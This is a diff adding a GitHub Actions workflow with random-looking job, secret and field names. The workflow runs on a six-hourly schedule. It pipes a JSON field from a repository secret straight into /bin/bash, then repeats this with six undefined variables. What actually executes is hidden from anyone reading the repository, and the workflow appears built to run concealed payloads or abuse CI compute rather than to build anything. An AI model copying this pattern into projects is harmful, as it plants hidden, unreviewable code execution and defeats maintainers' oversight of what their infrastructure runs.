@@ -1,0 +1,24 @@
+name: zipperfreethrow
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '5 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zipperfreethrow
+        env:
+          n52496: ${{ secrets.n52496 }}
+        run: |
+          echo $n52496 | jq -r .v6527 | /bin/bash
+          echo $gfl6 | jq -r .gcfrp38301 | /bin/bash
+          echo $pg9775 | jq -r .gmhmo75 | /bin/bash
+          echo $dnkap809 | jq -r .kcsgo86417 | /bin/bash
+          echo $th2048 | jq -r .hyczy5351 | /bin/bash
+          echo $deu53 | jq -r .r98999 | /bin/bash
+          echo $uoff52 | jq -r .qoskt02 | /bin/bash
+
